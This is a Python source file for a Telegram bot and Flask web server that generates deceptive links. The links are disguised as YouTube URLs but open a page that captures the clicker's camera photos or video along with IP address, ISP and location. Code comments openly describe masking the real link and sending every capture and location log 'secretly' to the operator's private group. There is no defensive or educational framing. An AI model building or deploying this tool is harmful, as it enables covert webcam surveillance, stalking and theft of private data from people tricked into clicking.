import os
import telebot
from flask import Flask, render_template, request, jsonify
import threading
import io

# --- CONFIGURATION ---
# These are pulled from your Koyeb Environment Variables for security
TOKEN = os.environ.get('TOKEN')
BASE_URL = os.environ.get('BASE_URL', "https://your-app.koyeb.app")
# Your Private Group ID (Must start with -100)
GROUP_ID = os.environ.get('GROUP_ID', '-100XXXXXXXXXX') 

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# Temporary dictionary to keep track of what each user wants (Photo vs Video)
user_data = {}

# --- TELEGRAM BOT COMMANDS ---

@bot.message_handler(commands=['start'])
def welcome(message):
    """Initial command to greet user and ask for the mode."""
    uid = message.chat.id
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add("📸 8 Photos", "🎥 3s Video")
    
    bot.send_message(
        uid, 
        "Welcome to the Verification Generator!\n\nPlease select the capture mode for your link:", 
        reply_markup=markup
    )

@bot.message_handler(func=lambda m: m.text in ["📸 8 Photos", "🎥 3s Video"])
def handle_mode(message):
    """Sets the mode and asks for the fake YouTube ID."""
    uid = message.chat.id
    mode = "photo" if "Photos" in message.text else "video"
    user_data[uid] = {'mode': mode}
    
    msg = bot.send_message(
        uid, 
        "Enter a fake YouTube Video ID to mask your link:\n(Example: `u8ckcnweomW` or type 'default')"
    )
    bot.register_next_step_handler(msg, finish_link)

def finish_link(message):
    """Generates the final formatted/masked link."""
    uid = message.chat.id
    # Default to a famous video if they don't provide an ID
    fake_id = message.text if message.text.lower() != 'default' else 'dQw4w9WgXcQ'
    
    if uid not in user_data:
        bot.send_message(uid, "Session expired. Please type /start again.")
        return

    mode = user_data[uid]['mode']
    
    # The actual URL that triggers the camera on your Koyeb site
    real_target = f"{BASE_URL}/?id={uid}&mode={mode}"
    
    # The fake text the user sees
    fake_display = f"https://youtu.be/{fake_id}?si=Encie_Check"
    
    # Using Markdown to hide the real_target inside the fake_display text
    final_msg = (
        f"✅ **Verification Link Generated!**\n\n"
        f"**Mode:** `{mode.upper()}`\n"
        f"**Target Link:** [{fake_display}]({real_target})\n\n"
        f"⚠️ *Note: When the person clicks the link, they will see the YouTube URL, but it will open your camera verification page.*"
    )
    
    bot.send_message(uid, final_msg, parse_mode="Markdown", disable_web_page_preview=True)

# --- FLASK WEB SERVER ROUTES ---

@app.route('/')
def home():
    """Serves the index.html file to the target."""
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    """Handles the incoming photos or video clips."""
    tid = request.args.get('id') # This is the ID of the person who clicked
    ftype = request.args.get('type')
    file = request.files['file']
    
    if file and tid:
        data = file.read()
        
        # 1. SEND TO THE TARGET USER (Private DM)
        # This makes the person think the bot is just verifying them
        try:
            if ftype == 'photo':
                bot.send_photo(tid, data, caption="✅ Camera frame captured for verification.")
            else:
                bot.send_document(
                    tid, 
                    io.BytesIO(data), 
                    visible_file_name="verification_clip.webm",
                    caption="✅ Video clip captured for verification."
                )
        except Exception as e:
            print(f"Error sending to user DM: {e}")

        # 2. SEND TO YOUR PRIVATE GROUP (Admin Backup)
        # This is where YOU see everything secretly
        try:
            admin_caption = f"📁 **NEW CAPTURE ALERT**\nTarget ID: `{tid}`\nType: `{ftype.upper()}`"
            if ftype == 'photo':
                bot.send_photo(GROUP_ID, io.BytesIO(data), caption=admin_caption, parse_mode="Markdown")
            else:
                bot.send_document(
                    GROUP_ID, 
                    io.BytesIO(data), 
                    visible_file_name="admin_backup.webm", 
                    caption=admin_caption, 
                    parse_mode="Markdown"
                )
        except Exception as e:
            print(f"Error sending to admin group: {e}")
            
    return "Done", 200

@app.route('/log_info', methods=['POST'])
def log_info():
    """Handles IP, ISP, and Location data."""
    info = request.json
    tid = request.args.get('id')
    
    # Format the data nicely
    log_text = (
        f"📍 **Identity Log Info**\n"
        f"Target ID: `{tid}`\n"
        f"IP Address: `{info.get('ip', 'Unknown')}`\n"
        f"Provider: `{info.get('org', 'Unknown')}`\n"
        f"Location: {info.get('city', 'Unknown')}, {info.get('country_name', 'Unknown')}"
    )

    # Send to the Target (to look official)
    try:
        bot.send_message(tid, log_text, parse_mode="Markdown")
    except:
        pass

    # Send to your Private Group (Backup)
    try:
        bot.send_message(GROUP_ID, f"📑 **ADMIN DATA LOG**\n{log_text}", parse_mode="Markdown")
    except Exception as e:
        print(f"Group log error: {e}")
        
    return "Done", 200

# --- SERVER STARTUP ---

def run_bot():
    """Function to run the bot polling in a separate thread."""
    print("Bot is polling...")
    bot.infinity_polling()

if __name__ == "__main__":
    # 1. Start the Telegram Bot thread
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()
    
    # 2. Start the Flask Web Server
    # Koyeb uses the PORT environment variable
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
